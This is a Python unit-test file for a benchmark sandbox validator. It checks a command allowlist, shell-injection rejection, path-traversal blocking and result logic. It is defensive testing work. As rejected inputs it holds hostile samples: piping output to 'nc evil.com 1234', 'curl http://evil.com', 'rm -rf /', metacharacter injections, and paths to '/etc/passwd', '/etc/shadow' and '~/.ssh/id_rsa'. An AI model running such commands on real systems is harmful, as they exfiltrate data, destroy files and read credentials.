"""Unit tests for sandbox.py."""

from __future__ import annotations

from airouter.engine.benchmark.sandbox import (
    ALLOWED_COMMANDS,
    ALLOWED_COMMANDS_ARGV,
    SANDBOX_IMAGE,
    SHELL_METACHARACTERS,
    SandboxResult,
    _extract_patch_files,
    _is_allowed_command,
    _static_validation,
    _validate_command,
    _validate_workspace_paths,
    run_harness_validation,
)

# ── 新安全测试 ───────────────────────────────────────────────


class TestValidateCommand:
    """_validate_command 安全验证测试。"""

    def test_pytest_allowed(self):
        valid, err = _validate_command("python -m pytest tests/ -q")
        assert valid is True
        assert err == ""

    def test_python_i_allowed(self):
        valid, err = _validate_command("python -I script.py")
        assert valid is True

    def test_bash_rejected(self):
        valid, err = _validate_command("bash script.sh")
        assert valid is False
        assert "allowlist" in err

    def test_rm_rejected(self):
        valid, err = _validate_command("rm -rf /")
        assert valid is False

    def test_empty_command_rejected(self):
        valid, err = _validate_command("")
        assert valid is False
        assert "empty" in err

    def test_return_tuple_format(self):
        result = _validate_command("python -m pytest")
        assert isinstance(result, tuple)
        assert len(result) == 2
        assert isinstance(result[0], bool)
        assert isinstance(result[1], str)


class TestShellMetacharacterRejection:
    """Shell 元字符注入攻击测试。"""

    def test_semicolon_injection(self):
        """python -m pytest; echo PWNED → rejected"""
        valid, err = _validate_command("python -m pytest; echo PWNED")
        assert valid is False
        assert "metacharacter" in err

    def test_ampersand_injection(self):
        """python -I x.py && echo PWNED → rejected"""
        valid, err = _validate_command("python -I x.py && echo PWNED")
        assert valid is False
        assert "metacharacter" in err

    def test_pipe_injection(self):
        """python -m pytest | nc evil.com 1234 → rejected"""
        valid, err = _validate_command("python -m pytest | nc evil.com 1234")
        assert valid is False
        assert "metacharacter" in err

    def test_backtick_injection(self):
        valid, err = _validate_command("python -m pytest `whoami`")
        assert valid is False

    def test_dollar_injection(self):
        valid, err = _validate_command("python -m pytest $HOME")
        assert valid is False

    def test_newline_injection(self):
        valid, err = _validate_command("python -m pytest\necho PWNED")
        assert valid is False

    def test_redirect_injection(self):
        valid, err = _validate_command("python -m pytest > /tmp/evil")
        assert valid is False

    def test_parenthesis_injection(self):
        valid, err = _validate_command("python -m pytest $(echo PWNED)")
        assert valid is False

    def test_all_metacharacters_rejected(self):
        """确保 SHELL_METACHARACTERS 中每个字符都被拒绝。"""
        for ch in SHELL_METACHARACTERS:
            valid, err = _validate_command(f"python -m pytest {ch} echo PWNED")
            assert valid is False, f"metacharacter {ch!r} was not rejected"


# ── 路径安全测试 ─────────────────────────────────────────────


class TestPathValidation:
    """路径校验测试。"""

    def test_normal_paths_allowed(self):
        errors = _validate_workspace_paths(
            {"main.py": "code", "tests/test_main.py": "test"},
            "",
        )
        assert errors == []

    def test_absolute_path_rejected(self):
        errors = _validate_workspace_paths({"/etc/passwd": "content"}, "")
        assert len(errors) == 1
        assert "absolute path" in errors[0]

    def test_path_traversal_rejected(self):
        errors = _validate_workspace_paths({"../../../etc/passwd": "content"}, "")
        assert len(errors) == 1
        assert "traversal" in errors[0]

    def test_home_directory_rejected(self):
        errors = _validate_workspace_paths({"~/.ssh/id_rsa": "content"}, "")
        assert len(errors) == 1
        assert "home directory" in errors[0]

    def test_windows_path_rejected(self):
        errors = _validate_workspace_paths({"\\windows\\system32": "content"}, "")
        assert len(errors) >= 1

    def test_patch_files_also_validated(self):
        patch = "--- a/../../etc/shadow\n+++ b/../../etc/shadow\n"
        errors = _validate_workspace_paths({}, patch)
        assert any("traversal" in e for e in errors)


# ── expected_exit_code 测试 ──────────────────────────────────


class TestExpectedExitCode:
    """expected_exit_code 校验测试。"""

    def test_default_zero(self):
        r = SandboxResult(exit_code=0, sandbox_type="container")
        assert r.passed is True

    def test_nonzero_expected(self):
        r = SandboxResult(exit_code=1, sandbox_type="container", expected_exit_code=1)
        assert r.passed is True

    def test_zero_when_nonzero_expected(self):
        r = SandboxResult(exit_code=0, sandbox_type="container", expected_exit_code=1)
        assert r.passed is False

    def test_unavailable_always_fails(self):
        r = SandboxResult(
            exit_code=0,
            sandbox_execution_unavailable=True,
            expected_exit_code=0,
        )
        assert r.passed is False


# ── 原有测试（更新接口）───────────────────────────────────────


class TestIsAllowedCommand:
    """向后兼容接口测试。"""

    def test_pytest_allowed(self):
        assert _is_allowed_command("python -m pytest tests/ -q") is True

    def test_python_i_allowed(self):
        assert _is_allowed_command("python -I script.py") is True

    def test_bash_rejected(self):
        assert _is_allowed_command("bash script.sh") is False

    def test_rm_rejected(self):
        assert _is_allowed_command("rm -rf /") is False

    def test_curl_rejected(self):
        assert _is_allowed_command("curl http://evil.com") is False

    def test_injection_rejected(self):
        """新行为：注入攻击被拒绝（旧版 startswith 会放过）。"""
        assert _is_allowed_command("python -m pytest; echo PWNED") is False
        assert _is_allowed_command("python -I x.py && echo PWNED") is False
        assert _is_allowed_command("python -m pytest | nc evil.com 1234") is False


class TestExtractPatchFiles:
    def test_unified_diff(self):
        patch = """--- a/main.py
+++ b/main.py
@@ -1,3 +1,4 @@
 line1
+new line
 line2
--- a/utils.py
+++ b/utils.py
@@ -1,2 +1,3 @@
 old
+new
"""
        files = _extract_patch_files(patch)
        assert "main.py" in files
        assert "utils.py" in files

    def test_empty_patch(self):
        assert _extract_patch_files("") == []

    def test_dev_null_excluded(self):
        patch = "--- /dev/null\n+++ b/new_file.py\n@@ -0,0 +1 @@\n+content"
        files = _extract_patch_files(patch)
        assert "new_file.py" in files
        assert "/dev/null" not in files


class TestStaticValidation:
    def test_clean_workspace(self):
        result = _static_validation(
            {"main.py": "code"},
            "",
            ["python -m pytest tests/ -q"],
        )
        assert result.sandbox_execution_unavailable is True
        assert result.sandbox_type == "static_only"

    def test_patch_references_missing_file(self):
        patch = "--- a/missing.py\n+++ b/missing.py\n@@ -1 +1 @@\n-old\n+new"
        result = _static_validation(
            {"main.py": "code"},
            patch,
            ["python -I test.py"],
        )
        assert result.sandbox_execution_unavailable is True
        assert "missing.py" in result.error_message

    def test_expected_exit_code_preserved(self):
        result = _static_validation({}, "", ["python -m pytest"], expected_exit_code=1)
        assert result.expected_exit_code == 1


class TestRunHarnessValidation:
    def test_no_commands(self):
        result = run_harness_validation({}, "", [])
        assert result.exit_code == 0

    def test_disallowed_command_rejected(self):
        result = run_harness_validation({}, "", ["rm -rf /"])
        assert result.exit_code == -1
        assert "allowlist" in result.error_message

    def test_injection_command_rejected(self):
        result = run_harness_validation({}, "", ["python -m pytest; echo PWNED"])
        assert result.exit_code == -1

    def test_path_traversal_rejected(self):
        result = run_harness_validation(
            {"../etc/passwd": "content"}, "", ["python -m pytest"],
        )
        assert result.exit_code == -1
        assert "traversal" in result.error_message

    def test_static_fallback_without_container(self):
        """Without Docker/Podman, falls back to static validation."""
        result = run_harness_validation(
            {"main.py": "print('hello')"},
            "",
            ["python -m pytest tests/ -q"],
        )
        # Either container execution or static fallback
        assert result.sandbox_type in ("container", "static_only")

    def test_expected_exit_code_in_result(self):
        result = run_harness_validation({}, "", [], expected_exit_code=1)
        assert result.expected_exit_code == 1


class TestSandboxResult:
    def test_passed_property(self):
        r = SandboxResult(exit_code=0, sandbox_type="container")
        assert r.passed is True

    def test_failed_property(self):
        r = SandboxResult(exit_code=1, sandbox_type="container")
        assert r.passed is False

    def test_unavailable_not_passed(self):
        r = SandboxResult(exit_code=0, sandbox_execution_unavailable=True)
        assert r.passed is False


class TestAllowedCommands:
    def test_frozen_set(self):
        assert "python -m pytest" in ALLOWED_COMMANDS
        assert "python -I" in ALLOWED_COMMANDS

    def test_argv_list(self):
        assert ["python", "-m", "pytest"] in ALLOWED_COMMANDS_ARGV
        assert ["python", "-I"] in ALLOWED_COMMANDS_ARGV


class TestSandboxImage:
    def test_fixed_version(self):
        """沙箱 image 必须使用固定版本，不能是 :latest。"""
        assert ":latest" not in SANDBOX_IMAGE
        assert ":" in SANDBOX_IMAGE  # 必须有版本标签


# ── Pre/Post patch validation ─────────────────────────────────


class TestSandboxPrePostValidation:
    """SandboxResult pre/post patch 验证 + passed 三条件公式。"""

    def test_sandbox_pre_patch_vacuous(self):
        """所有 pre-patch 命令通过 → pre_patch_vacuous=True, passed=False。"""
        r = SandboxResult(
            exit_code=0,
            pre_patch_exit_code=0,
            post_patch_exit_code=0,
            pre_patch_vacuous=True,
            test_files_modified=(),
            sandbox_type="container",
        )
        assert r.pre_patch_vacuous is True
        assert r.passed is False  # vacuous baseline → not passed

    def test_sandbox_pre_patch_baseline_valid(self):
        """至少一条 pre-patch 失败 → pre_patch_vacuous=False。"""
        r = SandboxResult(
            exit_code=0,
            pre_patch_exit_code=1,
            post_patch_exit_code=0,
            pre_patch_vacuous=False,
            test_files_modified=(),
            sandbox_type="container",
        )
        assert r.pre_patch_vacuous is False
        assert r.passed is True

    def test_sandbox_passed_requires_all_three(self):
        """passed = post_ok AND NOT vacuous AND NOT test_modified。"""
        # 全部满足 → passed
        r = SandboxResult(
            exit_code=0,
            pre_patch_exit_code=1,
            post_patch_exit_code=0,
            pre_patch_vacuous=False,
            test_files_modified=(),
            sandbox_type="container",
        )
        assert r.passed is True

        # post_patch 失败 → not passed
        r2 = SandboxResult(
            exit_code=1,
            pre_patch_exit_code=1,
            post_patch_exit_code=1,
            pre_patch_vacuous=False,
            test_files_modified=(),
            sandbox_type="container",
        )
        assert r2.passed is False

        # vacuous → not passed
        r3 = SandboxResult(
            exit_code=0,
            pre_patch_exit_code=0,
            post_patch_exit_code=0,
            pre_patch_vacuous=True,
            test_files_modified=(),
            sandbox_type="container",
        )
        assert r3.passed is False

    def test_sandbox_test_files_modified(self):
        """test_files_modified 非空 → passed=False。"""
        r = SandboxResult(
            exit_code=0,
            pre_patch_exit_code=1,
            post_patch_exit_code=0,
            pre_patch_vacuous=False,
            test_files_modified=("tests/test_x.py",),
            sandbox_type="container",
        )
        assert r.test_files_modified == ("tests/test_x.py",)
        assert r.passed is False

    def test_sandbox_frozen_dataclass(self):
        """SandboxResult 是 frozen dataclass，test_files_modified 用 tuple。"""
        r = SandboxResult(test_files_modified=("a.py", "b.py"))
        assert isinstance(r.test_files_modified, tuple)

    def test_sandbox_no_test_files_defaults(self):
        """无测试文件时，pre/post 字段为 None/默认值。"""
        r = SandboxResult(exit_code=0, sandbox_type="container")
        assert r.pre_patch_exit_code is None
        assert r.post_patch_exit_code is None
        assert r.pre_patch_vacuous is False
        assert r.test_files_modified == ()
        # 无 pre_patch 信息时 passed 回退到 exit_code 检查
        assert r.passed is True
